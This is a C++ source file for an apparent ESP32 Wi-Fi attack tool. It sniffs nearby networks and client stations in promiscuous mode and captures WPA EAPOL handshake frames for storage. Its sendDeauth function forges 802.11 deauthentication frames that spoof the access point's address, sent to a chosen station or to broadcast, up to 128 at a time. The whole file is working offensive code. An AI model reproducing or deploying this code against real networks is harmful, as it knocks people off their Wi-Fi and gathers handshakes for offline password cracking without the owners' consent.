#include "WifiAir.h"
#include <WiFi.h>

static WifiAir *activeWifiAir = nullptr;

namespace
{
/**
 * RAII guard for the WifiAir state mutex. Uses a non-blocking take for the
 * Wi-Fi callback and a blocking take everywhere else.
 */
class StateLockGuard
{
public:
    StateLockGuard(SemaphoreHandle_t mutex, bool block) : mutex(mutex), held(false)
    {
        if (!mutex) {
            return;
        }
        held = xSemaphoreTake(mutex, block ? portMAX_DELAY : 0) == pdTRUE;
    }

    ~StateLockGuard()
    {
        if (held && mutex) {
            xSemaphoreGive(mutex);
        }
    }

    bool acquired() const
    {
        return held;
    }

private:
    SemaphoreHandle_t mutex;
    bool held;
};
} // namespace

static bool isBroadcast(const uint8_t *mac)
{
    for (int i = 0; i < 6; ++i) {
        if (mac[i] != 0xff) {
            return false;
        }
    }

    return true;
}

void WifiAir::begin(Storage *storage)
{
    this->storage = storage;
    activeWifiAir = this;

    stateMutex = xSemaphoreCreateMutex();
    captureQueue = xQueueCreate(CAPTURE_QUEUE_DEPTH, sizeof(CaptureFrame));
    if (!stateMutex) {
        Serial.println("WIFI_STATE_MUTEX_FAILED");
    }
    if (!captureQueue) {
        Serial.println("WIFI_CAPTURE_QUEUE_FAILED");
    }

    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true, true);
    delay(100);
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(&WifiAir::promiscuousThunk);
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
}

void WifiAir::startScan()
{
    StateLockGuard lock(stateMutex, true);
    if (!lock.acquired()) {
        return;
    }

    scanning = true;
    lastHopMs = 0;
    currentChannel = target.active ? target.channel : 1;
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);
}

void WifiAir::stopScan()
{
    StateLockGuard lock(stateMutex, true);
    if (!lock.acquired()) {
        return;
    }

    scanning = false;
    esp_wifi_set_promiscuous(false);
}

void WifiAir::loop()
{
    drainCaptureQueue();

    StateLockGuard lock(stateMutex, true);
    if (!lock.acquired()) {
        return;
    }

    if (scanning && !target.active) {
        hopChannelLocked();
    }
}

bool WifiAir::selectTarget(const uint8_t *bssid, int channel)
{
    if (channel < 1 || channel > 13) {
        return false;
    }

    StateLockGuard lock(stateMutex, true);
    if (!lock.acquired()) {
        return false;
    }

    memcpy(target.bssid, bssid, 6);
    target.channel = channel;
    target.active = true;
    currentChannel = channel;

    for (auto &network : networks) {
        network.selected = network.used && macEquals(network.bssid, bssid);
    }

    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);
    scanning = true;
    return true;
}

void WifiAir::clearTarget()
{
    StateLockGuard lock(stateMutex, true);
    if (!lock.acquired()) {
        return;
    }

    target.active = false;

    for (auto &network : networks) {
        network.selected = false;
    }
}

String WifiAir::formatNetworks() const
{
    AirtoolsNetwork *snapshot = new AirtoolsNetwork[AIRTOOLS_MAX_NETWORKS];
    if (!snapshot) {
        return "ERR no_memory\n";
    }

    {
        StateLockGuard lock(stateMutex, true);
        if (!lock.acquired()) {
            delete[] snapshot;
            return "ERR state_lock_unavailable\n";
        }

        memcpy(snapshot, networks, sizeof(networks));
    }

    String response = "OK networks\n";
    response += "# bssid,channel,signal_dbm,beacons,probes,data,essid\n";

    for (int index = 0; index < AIRTOOLS_MAX_NETWORKS; ++index) {
        const AirtoolsNetwork &network = snapshot[index];
        if (!network.used) {
            continue;
        }

        response += macToString(network.bssid);
        response += ",";
        response += network.channel;
        response += ",";
        response += network.rssi;
        response += ",";
        response += network.beacons;
        response += ",";
        response += network.probes;
        response += ",";
        response += network.data;
        response += ",";
        response += network.essid;
        response += "\n";
    }

    delete[] snapshot;
    return response;
}

String WifiAir::formatClients() const
{
    AirtoolsClient *snapshot = new AirtoolsClient[AIRTOOLS_MAX_CLIENTS];
    if (!snapshot) {
        return "ERR no_memory\n";
    }

    AirtoolsTarget targetSnapshot;
    {
        StateLockGuard lock(stateMutex, true);
        if (!lock.acquired()) {
            delete[] snapshot;
            return "ERR state_lock_unavailable\n";
        }

        memcpy(snapshot, clients, sizeof(clients));
        targetSnapshot = target;
    }

    String response = "OK clients\n";
    response += "# bssid,station,signal_dbm,frames,last_seen\n";

    for (int index = 0; index < AIRTOOLS_MAX_CLIENTS; ++index) {
        const AirtoolsClient &client = snapshot[index];
        if (!client.used) {
            continue;
        }

        if (targetSnapshot.active && !macEquals(client.bssid, targetSnapshot.bssid)) {
            continue;
        }

        response += macToString(client.bssid);
        response += ",";
        response += macToString(client.station);
        response += ",";
        response += client.rssi;
        response += ",";
        response += client.frames;
        response += ",";
        response += client.lastSeenMs;
        response += "\n";
    }

    delete[] snapshot;
    return response;
}

String WifiAir::formatStatus() const
{
    StateLockGuard lock(stateMutex, true);
    if (!lock.acquired()) {
        return "ERR state_lock_unavailable\n";
    }

    String response;
    response += "mode=";
    response += scanning ? (target.active ? "capture" : "scan") : "idle";
    response += " scan=";
    response += scanning ? "1" : "0";
    response += " channel=";
    response += currentChannel;

    if (target.active) {
        response += " bssid=";
        response += macToString(target.bssid);
    }

    return response;
}

bool WifiAir::isScanning() const
{
    StateLockGuard lock(stateMutex, true);
    return lock.acquired() && scanning;
}

bool WifiAir::getTarget(uint8_t *bssid, int *channel) const
{
    StateLockGuard lock(stateMutex, true);
    if (!lock.acquired() || !target.active) {
        return false;
    }

    if (bssid) {
        memcpy(bssid, target.bssid, 6);
    }
    if (channel) {
        *channel = target.channel;
    }
    return true;
}

int WifiAir::sendDeauth(const uint8_t *bssid, int channel, const uint8_t *station, int count)
{
    if (!bssid || isZeroMac(bssid)) {
        return 0;
    }
    if (count < 1) {
        count = 1;
    }
    else if (count > 128) {
        count = 128;
    }

    int safeChannel = channel;
    if (safeChannel < 1) {
        safeChannel = 1;
    }
    else if (safeChannel > 13) {
        safeChannel = 13;
    }
    esp_wifi_set_channel(safeChannel, WIFI_SECOND_CHAN_NONE);

    uint8_t frame[26];
    memset(frame, 0, sizeof(frame));

    // Frame control: management type, deauthentication subtype.
    frame[0] = 0xC0;
    frame[1] = 0x00;

    // Address 1 (destination): the target station, or broadcast when unset.
    if (station && !isZeroMac(station) && !isBroadcast(station)) {
        memcpy(frame + 4, station, 6);
    }
    else {
        memset(frame + 4, 0xff, 6);
    }

    // Address 2 (source) and address 3 (BSSID) both spoof the access point.
    memcpy(frame + 10, bssid, 6);
    memcpy(frame + 16, bssid, 6);

    // Reason code 7: class 3 frame received from a nonassociated station.
    frame[24] = 0x07;
    frame[25] = 0x00;

    int sent = 0;
    for (int index = 0; index < count; ++index) {
        if (transmitRawFrame(frame, sizeof(frame))) {
            ++sent;
        }
    }

    return sent;
}

bool WifiAir::transmitRawFrame(const uint8_t *frame, int length)
{
    if (!frame || length < 24 || length > 1500) {
        return false;
    }

    return esp_wifi_80211_tx(WIFI_IF_STA, frame, length, true) == ESP_OK;
}

void WifiAir::promiscuousThunk(void *buffer, wifi_promiscuous_pkt_type_t type)
{
    if (!activeWifiAir || !buffer) {
        return;
    }

    activeWifiAir->handlePacket(static_cast<const wifi_promiscuous_pkt_t *>(buffer), type);
}

void WifiAir::handlePacket(const wifi_promiscuous_pkt_t *packet, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) {
        return;
    }

    const uint8_t *payload = packet->payload;
    int length = packet->rx_ctrl.sig_len;
    if (length < 24) {
        return;
    }

    uint16_t frameControl = payload[0] | (static_cast<uint16_t>(payload[1]) << 8);
    uint8_t frameType = (frameControl >> 2) & 0x03;
    uint8_t frameSubtype = (frameControl >> 4) & 0x0f;
    bool toDs = (frameControl & 0x0100) != 0;
    bool fromDs = (frameControl & 0x0200) != 0;
    int channel = packet->rx_ctrl.channel;
    int rssi = packet->rx_ctrl.rssi;

    // Try-lock so the Wi-Fi driver task never blocks on a slow format/read.
    StateLockGuard lock(stateMutex, false);
    if (!lock.acquired()) {
        return;
    }

    if (frameType == 0 && (frameSubtype == 8 || frameSubtype == 5)) {
        const uint8_t *bssid = payload + 16;
        if (isBroadcast(bssid) || isZeroMac(bssid) || !targetAccepts(bssid, channel)) {
            return;
        }

        char essid[33] = {};
        int offset = 36;
        while (offset + 2 <= length) {
            uint8_t tag = payload[offset];
            uint8_t tagLength = payload[offset + 1];
            offset += 2;
            if (offset + tagLength > length) {
                break;
            }

            if (tag == 0) {
                int copyLength = tagLength > 32 ? 32 : tagLength;
                memcpy(essid, payload + offset, copyLength);
                essid[copyLength] = 0;
                break;
            }

            offset += tagLength;
        }

        accountAp(bssid, essid, channel, rssi, frameSubtype == 8, frameSubtype == 5);
        return;
    }

    if (frameType == 2) {
        const uint8_t *bssid = nullptr;
        const uint8_t *station = nullptr;

        if (toDs && !fromDs) {
            bssid = payload + 4;
            station = payload + 10;
        }
        else if (!toDs && fromDs) {
            bssid = payload + 10;
            station = payload + 4;
        }
        else {
            return;
        }

        if (!bssid || !station || isBroadcast(station) || isZeroMac(station) || !targetAccepts(bssid, channel)) {
            return;
        }

        accountAp(bssid, "", channel, rssi, false, false);
        accountClient(bssid, station, rssi);
        recordEapolIfPresent(bssid, payload, length, frameSubtype, toDs, fromDs);
    }
}

void WifiAir::recordEapolIfPresent(const uint8_t *bssid, const uint8_t *frame, int length, uint8_t subtype, bool toDs, bool fromDs)
{
    int headerLength = 24;
    if (toDs && fromDs) {
        headerLength += 6;
    }
    if ((subtype & 0x08) != 0) {
        headerLength += 2;
    }
    if (length < headerLength + 8) {
        return;
    }

    const uint8_t *llc = frame + headerLength;
    bool snap = llc[0] == 0xaa && llc[1] == 0xaa && llc[2] == 0x03 &&
        llc[3] == 0x00 && llc[4] == 0x00 && llc[5] == 0x00;
    uint16_t etherType = (static_cast<uint16_t>(llc[6]) << 8) | llc[7];
    if (!snap || etherType != 0x888e) {
        return;
    }

    // EAPOL payload begins after the 8-byte LLC/SNAP header.
    int eapolOffset = headerLength + 8;
    if (length < eapolOffset + 8) {
        return;
    }
    if (frame[eapolOffset + 1] != 3) {
        return;  // only EAPOL-Key (WPA handshake) frames
    }
    uint16_t keyInfo = (static_cast<uint16_t>(frame[eapolOffset + 5]) << 8) | frame[eapolOffset + 6];
    bool hasMic = (keyInfo & 0x0100) != 0;
    bool hasAck = (keyInfo & 0x0080) != 0;

    enqueueCaptureFrame(bssid, frame, static_cast<uint32_t>(length), hasMic, hasAck);
}

void WifiAir::enqueueCaptureFrame(const uint8_t *bssid, const uint8_t *frame, uint32_t length, bool hasMic, bool hasAck)
{
    if (!captureQueue || !frame || length == 0 || length > AIRTOOLS_MAX_CAPTURE_FRAME_BYTES) {
        return;
    }

    memcpy(pendingCaptureFrame.bssid, bssid, 6);
    pendingCaptureFrame.length = length;
    pendingCaptureFrame.hasMic = hasMic;
    pendingCaptureFrame.hasAck = hasAck;
    memcpy(pendingCaptureFrame.data, frame, length);

    // Non-blocking: drop the frame when the consumer cannot keep up.
    xQueueSend(captureQueue, &pendingCaptureFrame, 0);
}

void WifiAir::drainCaptureQueue()
{
    if (!storage || !captureQueue) {
        return;
    }

    while (xQueueReceive(captureQueue, &drainCaptureFrame, 0) == pdTRUE) {
        char essid[33];
        getEssid(drainCaptureFrame.bssid, essid, sizeof(essid));
        storage->recordCaptureFrame(drainCaptureFrame.bssid, essid, drainCaptureFrame.data, drainCaptureFrame.length,
                                    drainCaptureFrame.hasMic, drainCaptureFrame.hasAck);
    }
}

const char *WifiAir::essidForLocked(const uint8_t *bssid) const
{
    for (const auto &network : networks) {
        if (network.used && macEquals(network.bssid, bssid) && network.essid[0]) {
            return network.essid;
        }
    }

    return "";
}

void WifiAir::getEssid(const uint8_t *bssid, char *out, size_t outLength) const
{
    out[0] = 0;

    StateLockGuard lock(stateMutex, true);
    if (!lock.acquired()) {
        return;
    }

    const char *essid = essidForLocked(bssid);
    strncpy(out, essid, outLength - 1);
    out[outLength - 1] = 0;
}

void WifiAir::accountAp(const uint8_t *bssid, const char *essid, int channel, int rssi, bool beacon, bool probe)
{
    AirtoolsNetwork *network = findOrCreateNetwork(bssid);
    if (!network) {
        return;
    }

    network->channel = channel;
    network->rssi = rssi;
    network->lastSeenMs = millis();

    if (essid && essid[0]) {
        strncpy(network->essid, essid, sizeof(network->essid) - 1);
        network->essid[sizeof(network->essid) - 1] = 0;
    }

    if (beacon) {
        network->beacons++;
    }
    if (probe) {
        network->probes++;
    }
    if (!beacon && !probe) {
        network->data++;
    }
}

void WifiAir::accountClient(const uint8_t *bssid, const uint8_t *station, int rssi)
{
    AirtoolsClient *client = findOrCreateClient(bssid, station);
    if (!client) {
        return;
    }

    client->rssi = rssi;
    client->frames++;
    client->lastSeenMs = millis();
}

AirtoolsNetwork *WifiAir::findOrCreateNetwork(const uint8_t *bssid)
{
    AirtoolsNetwork *freeSlot = nullptr;

    for (auto &network : networks) {
        if (network.used && macEquals(network.bssid, bssid)) {
            return &network;
        }

        if (!network.used && !freeSlot) {
            freeSlot = &network;
        }
    }

    if (!freeSlot) {
        return nullptr;
    }

    freeSlot->used = true;
    memcpy(freeSlot->bssid, bssid, 6);
    freeSlot->essid[0] = 0;
    return freeSlot;
}

AirtoolsClient *WifiAir::findOrCreateClient(const uint8_t *bssid, const uint8_t *station)
{
    AirtoolsClient *freeSlot = nullptr;

    for (auto &client : clients) {
        if (client.used && macEquals(client.bssid, bssid) && macEquals(client.station, station)) {
            return &client;
        }

        if (!client.used && !freeSlot) {
            freeSlot = &client;
        }
    }

    if (!freeSlot) {
        return nullptr;
    }

    freeSlot->used = true;
    memcpy(freeSlot->bssid, bssid, 6);
    memcpy(freeSlot->station, station, 6);
    return freeSlot;
}

bool WifiAir::targetAccepts(const uint8_t *bssid, int channel) const
{
    if (!target.active) {
        return true;
    }

    return channel == target.channel && macEquals(target.bssid, bssid);
}

void WifiAir::hopChannelLocked()
{
    uint32_t now = millis();
    if (now - lastHopMs < 450) {
        return;
    }

    lastHopMs = now;
    currentChannel++;
    if (currentChannel > 13) {
        currentChannel = 1;
    }

    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
}
